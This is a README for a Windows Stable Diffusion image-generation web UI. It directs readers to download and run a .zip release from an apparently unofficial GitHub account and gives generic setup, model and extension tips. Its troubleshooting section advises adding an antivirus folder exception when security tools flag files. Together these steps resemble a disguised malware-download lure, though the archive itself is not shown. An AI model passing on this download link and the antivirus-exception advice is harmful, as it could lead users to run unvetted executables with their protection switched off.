# 🎨 Stable-Diffusion-WebUI - Create images from text on Windows

[![](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/Kristinunreconciled297/Stable-Diffusion-WebUI/releases)

## What is this tool

Stable-Diffusion-WebUI lets you run an image generator on your home computer. You type a description in a text box, and the software creates an image for you. It works offline, so you do not need an internet connection to create pictures after the initial setup. This software uses artificial intelligence to turn words into visual files. You can create landscapes, portraits, art, and complex patterns.

## 💻 System Requirements

To run this software, your computer needs specific hardware components. Stable Diffusion performs complex math tasks that require a powerful graphics card.

- Operating System: Windows 10 or Windows 11.
- Graphics Card: NVIDIA GPU with at least 6GB of video memory (VRAM). 8GB or more is better for speed.
- System Memory: 16GB of RAM.
- Storage: 20GB of free space on your hard drive. 
- Internet: A connection to download the initial files.

If your computer uses an integrated graphics chip, the software will run slowly. Please ensure your drivers are up to date before you start the installation process.

## 🚀 Downloading the Software

You must download the correct files to start. 

1. Visit the project page here: [https://github.com/Kristinunreconciled297/Stable-Diffusion-WebUI/releases](https://github.com/Kristinunreconciled297/Stable-Diffusion-WebUI/releases).
2. Choose the latest release from the list.
3. Click the file ending in .zip to start the download.
4. Move the file from your downloads folder to a folder on your computer where you want the program to live. Avoid folders with long or complex paths.

## ⚙️ Installation Steps

Follow these steps to set up the software.

1. Right-click the zip file you downloaded.
2. Select Extract All to open the contents.
3. Open the folder you just created.
4. Look for a file named `webui-user.bat`.
5. Double-click this file to start the setup.

A black window called the command prompt will appear on your screen. This is normal. The software will now download necessary components like Python and Torch. This process takes time depending on your internet speed. Wait for the window to finish downloading and installing these background tools. Do not close the window while it works.

Once the setup completes, you will see a message saying "Running on local URL: http://127.0.0.1:7860". 

## 🖼️ Running the Application

Open your web browser after the setup finishes. Type `http://127.0.0.1:7860` into the address bar. The Stable Diffusion interface will load inside your browser. You can now type a prompt in the text box labeled "Prompt" and click the "Generate" button. The software will create an image and display it on the right side of the screen.

## 🛠️ Optimizing Performance

If you see an "Out of Memory" error or if the program runs slowly, you can change the settings in the `webui-user.bat` file.

1. Right-click `webui-user.bat` and choose Edit.
2. Find the line that starts with `set COMMANDLINE_ARGS=`.
3. Add `--xformers` to the end of that line. This tells the program to use a memory-saving tool.
4. Save the file and close it.
5. Restart the application by double-clicking `webui-user.bat` again.

You can also use `--lowvram` if you continue to see memory errors. This forces the program to use less space on your graphics card.

## 🔌 Using Extensions

This tool supports extensions to add more features. You can add ControlNet, which gives you more control over the shape and pose of your generated images.

1. Click the "Extensions" tab in the web interface.
2. Select "Available".
3. Click "Load from".
4. Search for the extension you want to add.
5. Click "Install" next to the name.
6. Restart the web interface to finish adding the feature.

## 📦 Managing Models

The software uses files called "checkpoints" to determine the style of the images. You can find these files on websites like Civitai. 

1. Download a safetensors file from a model repository.
2. Move the file into the `models/Stable-diffusion` folder inside your program folder.
3. Go back to the web interface.
4. Click the "Refresh" button near the model selection menu at the top left.
5. Select your new model from the dropdown list.

You can also download Lora models for specific characters or styles. Place these files in the `models/Lora` folder. You can use these by clicking the red button below the Generate button in the interface.

## 📈 Troubleshooting Errors

- CUDA Errors: These usually happen if your graphics card drivers are old. Visit the NVIDIA website to download the latest drivers for your specific card.
- Slow Generation: Close other programs like web browsers or games while you run Stable Diffusion. These programs compete for space on your graphics card.
- Blank Window: If the command prompt window closes immediately, right-click the file and choose Edit. Add the word `pause` on a new line at the bottom of the file. Save and run it again. This will keep the window open so you can read the error message.
- Missing Files: Check if your antivirus software blocked any files. Sometimes security tools mistake new programs for threats. You might need to add a folder exception in your antivirus settings.

## 💡 Tips for Success

- Keep your prompts simple at first. Use names of objects and descriptions of colors.
- Use the "Upscaler" settings in the "Extras" tab to increase the quality of images you already generated.
- Check the official GitHub repository wiki if you want to learn about advanced settings like CFG scale or sampling steps.
- Use the "txt2img" tab for generating new images from text.
- Use the "img2img" tab if you want to upload an existing image and change it based on a prompt.
- Experiment with different samplers in the settings menu. Some samplers finish faster than others.